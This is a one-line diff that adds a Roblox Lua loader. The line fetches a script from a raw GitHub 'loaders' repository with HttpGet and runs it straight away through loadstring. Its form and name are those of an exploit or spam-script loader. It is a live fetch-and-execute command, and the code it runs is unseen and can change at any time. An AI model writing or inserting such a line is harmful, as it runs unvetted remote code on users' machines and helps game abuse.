@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/interrogation-ai-spam7-eoa6yn7bik1plv.lua"))()
